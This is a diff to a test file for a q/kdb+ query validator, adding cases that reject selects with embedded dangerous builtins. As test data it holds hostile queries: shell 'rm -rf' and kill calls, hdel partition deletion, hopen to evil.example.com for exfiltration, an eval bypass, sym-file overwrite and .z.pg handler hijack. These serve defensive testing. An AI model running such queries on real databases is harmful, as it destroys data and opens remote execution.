@@ -47,6 +47,36 @@ CASES = [
      "SELECT * FROM ref", "rewrite", "LIMIT 1000000"),
     ("sql: bounded -> allow",
      "SELECT * FROM ref LIMIT 50", "allow", None),
+
+    # --- dangerous q builtins embedded in an otherwise-valid select MUST reject.
+    # The DB only ever receives a read; a select whose body calls OS/file/eval/
+    # handler builtins is not a read. (Found by the FSP pilot: `select system
+    # "rm -rf /data" from trade` was structurally accepted and ran shell.)
+    ("q: embedded system shell -> reject",
+     'select system "rm -rf /data/hdb" from trade where date=.z.d', "reject", None),
+    ("q: embedded hdel (delete partition dir) -> reject",
+     "select from trade where date=.z.d, x:hdel `:/data/hdb/2015.01.08", "reject", None),
+    ("q: embedded hopen (exfil/lateral) -> reject",
+     "select from trade where date=.z.d, h:hopen `:evil.example.com:9999", "reject", None),
+    ("q: value/eval dynamic-eval bypass -> reject",
+     'select value "system \\"id\\"" from trade where date=.z.d', "reject", None),
+    ("q: exec system kill -> reject",
+     'exec system "kill -9 12345" from trade where date=.z.d', "reject", None),
+    ("q: set overwrite (e.g. sym file) -> reject",
+     "select set `:/data/hdb/sym from trade where date=.z.d", "reject", None),
+    ("q: .z.pg handler hijack -> reject",
+     "select from trade where date=.z.d, .z.pg:{system x}", "reject", None),
+    ("q: save to disk -> reject",
+     "select save `:/tmp/dump from trade where date=.z.d", "reject", None),
+    ("q: persistent update on backtick table (embedded) -> reject",
+     "select x from (update price:0 from `trade) where date=.z.d", "reject", None),
+    ("q: 2: dynamic shared-object load -> reject",
+     'select (`:libx 2: (`f;1)) from trade where date=.z.d', "reject", None),
+    # benign date/time .z reads and functional update must STILL pass (no over-block)
+    ("q: benign .z.d date read -> not rejected by handler rule",
+     "select from quote where date=.z.d, i<100", "allow", None),
+    ("q: functional update in analytics (no backtick) -> not over-blocked",
+     "select avg mid from (update mid:(bid+ask)%2 from quote) where date=.z.d", "rewrite", "i<"),
 ]
 
 
